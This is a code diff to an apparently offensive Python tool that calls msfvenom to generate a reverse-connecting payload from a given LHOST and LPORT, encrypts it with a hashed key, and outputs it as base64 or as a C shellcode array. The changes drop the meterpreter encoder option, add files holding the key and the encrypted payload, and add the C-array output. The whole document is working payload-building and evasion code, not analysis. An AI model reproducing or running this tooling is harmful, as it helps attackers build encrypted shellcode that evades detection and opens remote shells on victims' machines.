@@ -14,7 +14,6 @@ def main():
 	payload = args.payload
 	method = args.method
 	format = args.format
-	encoder = args.encoder
 
 	''' generate msfvenom payload '''
 	print("[+] Generating MSFVENOM payload...")
@@ -22,7 +21,7 @@ def main():
 		'-p', payload,
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
-		'-e', encoder,
+#		'-b', '\\x00',
 		'-f', 'raw',
 		'-o', './msf.bin'],
 		capture_output=False)
@@ -31,16 +30,35 @@ def main():
 	buf = f.read()
 	f.close()
 
+	print("[+] key and payload will be written to key.b64 and payload.b64")
+
 	''' encrypt the payload '''
 	print("[+] Encrypting the payload, key=" + key + "...")
 	hkey = hash_key(key)
 	encrypted = encrypt(hkey, hkey[:16], buf)
 	b64 = base64.b64encode(encrypted)
 
+	f = open("./key.b64", "w")
+	f.write(key)
+	f.close()
+
+	f = open("./payload.b64", "w")
+	f.write(b64.decode('utf-8'))
+	f.close()
+
 	if format == "b64":
 		''' base64 output '''
 		print("[+] Base64 output:")
 		print(b64.decode('utf-8'))
+		print("\n[+] Have a nice day!")
+		return
+	if format == "c":
+		''' c output '''
+		print("[+] C output:")
+		hex_string = 'unsigned char payload[] ={0x';
+		hex = '0x'.join('{:02x},'.format(x) for x in encrypted)
+		hex_string = hex_string + hex[:-1] + "};"
+		print(hex_string)
 		print("\n[+] Have a nice day!")
 		return
 
@@ -85,8 +103,8 @@ def parse_args():
 		help="The method to use: thread/delegate.")
 	parser.add_argument("-k", "--key", default="", type=str,
 		help="The encryption key (32 chars).")
-	parser.add_argument("-e", "--encoder", default="x64/xor_dynamic", type=str,
-		help="The meterpreter encoder.")
+
+
 	parser.add_argument("-f", "--format", default="b64", type=str,
 		help="The format to output.")
 
